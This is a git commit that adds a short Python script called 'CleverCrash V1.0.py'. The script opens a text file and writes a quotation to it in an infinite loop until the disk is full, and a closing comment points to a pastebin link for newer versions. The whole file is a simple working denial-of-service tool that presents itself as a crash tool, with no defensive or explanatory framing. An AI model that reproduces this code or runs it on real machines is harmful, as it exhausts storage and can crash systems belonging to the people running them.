5ebb3202547045c15647b462b6fc448504eb2171
dev-on-smirnoff <135349450+dev-on-smirnoff@users.noreply.github.com>
2023-06-13 19:52:46 +0100

    Add files via upload

---
+++ CleverCrash V1.0.py
@@ -0,0 +1,10 @@
+text = "“My unmatched perspicacity coupled with my sheer indefatigability makes me a feared opponent in any realm of human endeavor.” ~ Emory Tate"
+
+f = open("Mhm.txt" , "w+")
+a = ""
+
+if a == "":
+    while(True):
+        f.write(text + "%d\r\n")
+
+#Get the latest version of this tool at https://pastebin.com/raw/QXjbt1Uz
